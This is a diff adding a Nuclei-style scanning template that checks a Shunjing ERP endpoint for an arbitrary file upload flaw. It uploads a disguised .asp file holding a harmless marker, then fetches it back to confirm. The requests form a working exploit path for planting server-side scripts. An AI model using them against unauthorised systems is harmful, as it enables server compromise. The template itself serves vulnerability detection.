@@ -1,0 +1,51 @@
+id: centersoft-uploadinvtspfile-anyfile-upload
+info:
+  name: 顺景ERP管理系统 UploadInvtSpFile 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=-----------------1111
+
+        -------------------1111
+        Content-Disposition: form-data; name="filedata"; filename="{{random_file}}.asp"
+        Content-Type: image/png
+
+        {{payload_content}}
+        -------------------1111--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".asp"
+          - "filepath"
+    extractors:
+      - type: regex
+        internal: true
+        name: filename
+        regex:
+          - "InvtSpFiles\\\\(?P<filename>[0-9a-z-]+).asp"
+  - raw:
+      - |
+        GET /InvtSpFiles/{{filename}}.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{payload_content}}"
+variables:
+  random_file: "{{rand_text_alphanumeric(4)}}"
+  payload_content: "{{base64(random_file)}}"
